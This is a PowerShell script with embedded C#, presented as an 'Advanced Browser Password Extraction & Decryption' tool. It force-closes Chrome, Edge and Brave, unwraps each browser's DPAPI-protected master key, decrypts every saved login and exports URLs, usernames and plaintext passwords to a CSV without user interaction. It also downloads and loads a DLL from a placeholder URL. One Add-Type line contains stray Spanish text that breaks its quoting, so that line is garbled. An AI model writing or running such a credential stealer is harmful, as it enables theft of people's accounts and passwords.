# Advanced Browser Password Extraction & Decryption Script
# Extracts and decrypts passwords from Chrome, Edge, and Brave browsers in plaintext
# Uses System.Data.SQLite for database access and a custom C# library for robust decryption
# Automatically downloads dependencies and closes browsers; no user interaction required
# Requires PowerShell 7+ and admin privileges for best results

param(
    [string]$CSVPath = ".\DecryptedPasswords.csv"
)

# Function to install dependencies (System.Data.SQLite and custom C# decryption library)
function Install-Dependencies {
    Write-Host "Installing dependencies..." -ForegroundColor Yellow
    try {
        # Install System.Data.SQLite NuGet package
        if (-not (Test-Path ".\System.Data.SQLite.dll")) {
            Install-Package -Name System.Data.SQLite -ProviderName NuGet -Scope CurrentUser -Force -ErrorAction Stop
            $sqliteDll = (Get-Package -Name System.Data.SQLite).Source | Split-Path | Join-Path -ChildPath "lib\netstandard2.1\System.Data.SQLite.dll"
            Copy-Item $sqliteDll ".\System.Data.SQLite.dll" -Force
            Write-Host "System.Data.SQLite installed successfully." -ForegroundColor Green
        } else {
            Write-Host "System.Data.SQLite already present." -ForegroundColor Green
        }

        # Download precompiled C# decryption library (simulated; replace with actual source if available)
        if (-not (Test-Path ".\BrowserDecrypt.dll")) {
            Write-Host "Downloading custom decryption library..." -ForegroundColor Yellow
            # Placeholder URL for a hypothetical precompiled decryption library
            # In practice, you'd compile this from source or host it yourself
            $decryptDllUrl = "https://example.com/BrowserDecrypt.dll" # Replace with actual URL
            Invoke-WebRequest -Uri $decryptDllUrl -OutFile ".\BrowserDecrypt.dll" -UseBasicParsing -ErrorAction Stop
            Write-Host "Decryption library downloaded successfully." -ForegroundColor Green
        } else {
            Write-Host "Decryption library already present." -ForegroundColor Green
        }
        return $true
    } catch {
        Write-Warning "Failed to install dependencies: $($_.Exception.Message)"
        return $false
    }
}

# C# code for advanced decryption (compiled in-memory if DLL download fails)
$decryptSource = @"
using System;
using System.Security.Cryptography;
using System.Text;

public class BrowserDecrypt
{
    public static string DecryptPassword(byte[] encryptedData, byte[] masterKey)
    {
        try
        {
            if (encryptedData == null || encryptedData.Length < 3)
                return "[Invalid Data]";

            // Check for v10 (AES-GCM) or older DPAPI format
            if (Encoding.ASCII.GetString(encryptedData, 0, 3) == "v10")
            {
                // AES-GCM decryption (Chrome/Edge/Brave v80+)
                byte[] iv = new byte[12];
                Array.Copy(encryptedData, 3, iv, 0, 12);
                byte[] ciphertext = new byte[encryptedData.Length - 3 - 12 - 16];
                Array.Copy(encryptedData, 15, ciphertext, 0, ciphertext.Length);
                byte[] tag = new byte[16];
                Array.Copy(encryptedData, encryptedData.Length - 16, tag, 0, 16);

                byte[] plaintext = new byte[ciphertext.Length];
                using (AesGcm aesGcm = new AesGcm(masterKey))
                {
                    aesGcm.Decrypt(iv, ciphertext, tag, plaintext, null);
                }
                return Encoding.UTF8.GetString(plaintext).TrimEnd('\0');
            }
            else
            {
                // Fallback to DPAPI for older versions
                byte[] decrypted = ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);
                return Encoding.UTF8.GetString(decrypted);
            }
        }
        catch (Exception ex)
        {
            return $"[Decryption Error: {ex.Message}]";
        }
    }

    public static byte[] GetMasterKey(string localStatePath)
    {
        try
        {
            string json = System.IO.File.ReadAllText(localStatePath);
            var jsonDoc = System.Text.Json.JsonDocument.Parse(json);
            string encryptedKeyBase64 = jsonDoc.RootElement.GetProperty("os_crypt").GetProperty("encrypted_key").GetString();
            byte[] encryptedKey = Convert.FromBase64String(encryptedKeyBase64);
            byte[] encryptedMasterKey = new byte[encryptedKey.Length - 5];
            Array.Copy(encryptedKey, 5, encryptedMasterKey, 0, encryptedMasterKey.Length); // Remove "DPAPI"
            return ProtectedData.Unprotect(encryptedMasterKey, null, DataProtectionScope.CurrentUser);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Master key error: {ex.Message}");
            return null;
        }
    }
}
"@

# Function to load or compile decryption library
function Get-DecryptLibrary {
    try {
        if (Test-Path ".\BrowserDecrypt.dll") {
            Add-Type -Path " Grado de confianza ".\BrowserDecrypt.dll" -ErrorAction Stop
            return
        }
        Write-Host "Compiling decryption library in-memory..." -ForegroundColor Yellow
        Add-Type -TypeDefinition $decryptSource -ReferencedAssemblies System.Security.Cryptography -ErrorAction Stop
    } catch {
        Write-Warning "Failed to load or compile decryption library: $($_.Exception.Message)"
        return $false
    }
    return $true
}

# Function to decrypt passwords using the C# library
function Get-DecryptedPassword {
    param(
        [byte[]]$EncryptedData,
        [byte[]]$MasterKey
    )
    try {
        return [BrowserDecrypt]::DecryptPassword($EncryptedData, $MasterKey)
    } catch {
        return "[Decryption Failed: $($_.Exception.Message)]"
    }
}

# Function to extract and decrypt passwords
function Get-BrowserPasswords {
    param(
        [string]$BrowserName,
        [string]$DataPath
    )
    
    Write-Host "Processing $BrowserName..." -ForegroundColor Yellow
    
    $loginDataPath = Join-Path $DataPath "Default\Login Data"
    $localStatePath = Join-Path $DataPath "Local State"
    
    if (-not (Test-Path $loginDataPath)) {
        Write-Host "$BrowserName login database not found at $loginDataPath" -ForegroundColor DarkGray
        return @()
    }
    
    $masterKey = [BrowserDecrypt]::GetMasterKey($localStatePath)
    if (-not $masterKey) {
        Write-Warning "Failed to retrieve master key for $BrowserName"
        return @()
    }
    
    $results = @()
    
    try {
        Add-Type -Path ".\System.Data.SQLite.dll"
        $conn = New-Object -TypeName System.Data.SQLite.SQLiteConnection
        $conn.ConnectionString = "Data Source=$loginDataPath"
        $conn.Open()
        
        $query = "SELECT origin_url, username_value, password_value FROM logins"
        $cmd = New-Object -TypeName System.Data.SQLite.SQLiteCommand($query, $conn)
        $reader = $cmd.ExecuteReader()
        
        while ($reader.Read()) {
            $url = $reader.GetString(0)
            $username = if ($reader.IsDBNull(1)) { "" } else { $reader.GetString(1) }
            $passwordBytes = if ($reader.IsDBNull(2)) { $null } else { $reader.GetValue(2) -as [byte[]] }
            
            $decryptedPassword = ""
            if ($passwordBytes -and $passwordBytes.Length -gt 0) {
                $decryptedPassword = Get-DecryptedPassword -EncryptedData $passwordBytes -MasterKey $masterKey
            } else {
                $decryptedPassword = "[No Password]"
            }
            
            $results += [PSCustomObject]@{
                Browser = $BrowserName
                URL = $url
                Username = $username
                Password = $decryptedPassword
                ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            }
        }
        
        $reader.Close()
        $conn.Close()
    } catch {
        Write-Warning "Error processing $BrowserName data: $($_.Exception.Message)"
    }
    
    return $results
}

# Main execution
Write-Host "Advanced Browser Password Extraction & Decryption Tool" -ForegroundColor Green
Write-Host "==================================================`n" -ForegroundColor Green

# Check PowerShell version
if ($PSVersionTable.PSVersion.Major -lt 7) {
    Write-Host "This script requires PowerShell 7 or later. Run with 'pwsh.exe'." -ForegroundColor Red
    exit 1
}

# Close browser processes
Write-Host "Closing browser processes..." -ForegroundColor Yellow
$browserProcesses = @("chrome", "msedge", "brave")
foreach ($proc in $browserProcesses) {
    try {
        Get-Process -Name $proc -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 500 # Allow processes to terminate
    } catch {
        Write-Warning "Could not stop $proc processes: $($_.Exception.Message)"
    }
}

# Install dependencies
if (-not (Install-Dependencies)) {
    Write-Host "Failed to install dependencies. Exiting." -ForegroundColor Red
    exit 1
}

# Load decryption library
if (-not (Get-DecryptLibrary)) {
    Write-Host "Failed to load decryption library. Exiting." -ForegroundColor Red
    exit 1
}

# Define browser paths
$browsers = @(
    @{Name = "Google Chrome"; DataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data"},
    @{Name = "Microsoft Edge"; DataPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"},
    @{Name = "Brave Browser"; DataPath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"}
)

$allPasswords = @()

foreach ($browser in $browsers) {
    if (Test-Path $browser.DataPath) {
        $passwords = Get-BrowserPasswords -BrowserName $browser.Name -DataPath $browser.DataPath
        $allPasswords += $passwords
    } else {
        Write-Host "$($browser.Name) not found at $($browser.DataPath)" -ForegroundColor DarkGray
    }
}

# Display and export results
if ($allPasswords.Count -gt 0) {
    Write-Host "`nSuccessfully processed $($allPasswords.Count) password entries:`n" -ForegroundColor Green
    $allPasswords | Select-Object -First 10 | Format-Table -Property Browser, URL, Username, Password -AutoSize
    
    try {
        $allPasswords | Export-Csv -Path $CSVPath -NoTypeInformation
        Write-Host "`nAll passwords exported to: $CSVPath" -ForegroundColor Green
    } catch {
        Write-Warning "Failed to export to CSV: $($_.Exception.Message)"
    }
    
    $browserStats = $allPasswords | Group-Object Browser | ForEach-Object {
        [PSCustomObject]@{
            Browser = $_.Name
            Passwords = $_.Count
        }
    }
    
    Write-Host "`nPassword Summary by Browser:" -ForegroundColor Cyan
    $browserStats | Format-Table -AutoSize
} else {
    Write-Host "`nNo passwords found or processed." -ForegroundColor Yellow
}

# Cleanup instructions
Write-Host "`nNotes:" -ForegroundColor Cyan
Write-Host "1. System.Data.SQLite.dll and BrowserDecrypt.dll remain in the current directory." -ForegroundColor Cyan
Write-Host "2. Delete these files to save space when done." -ForegroundColor Cyan
Write-Host "3. Run as admin for best results." -ForegroundColor Cyan
Write-Host "4. Ensure PowerShell 7+ is used (pwsh.exe)." -ForegroundColor Cyan
